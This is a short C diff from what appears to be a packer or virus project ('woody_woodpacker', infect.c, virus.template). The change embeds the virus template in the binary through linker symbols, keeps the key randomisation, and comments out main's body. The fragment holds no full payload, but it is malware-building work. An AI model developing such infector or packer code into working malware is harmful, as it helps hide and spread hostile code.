@@ -19,10 +19,12 @@ void randomize(char *k){
 
 extern char KEY[16]; //defined in infect.c
 
+extern char bin_start;
+extern char bin_end;
+
 int woody_woodpacker(char *bin_to_pack){
-	char *template;
-	size_t n;
-	fget("bin/virus.template", &template, &n);
+	char *template = (char*)&bin_start;
+	size_t n = ((size_t)(&bin_end)) - ((size_t)(&bin_start));
 	randomize(KEY);
 	/*print("KEY IS: ");
         printnb(((uint32_t*)KEY)[0]);print(" ");
@@ -35,8 +37,8 @@ int woody_woodpacker(char *bin_to_pack){
 }
 
 int main(int ac, char **av){
-	if (ac < 2){
+	/*if (ac < 2){
 		return usage(av[0]);
 	}
-	return woody_woodpacker(av[1]);
+	return woody_woodpacker(av[1]);*/
 }
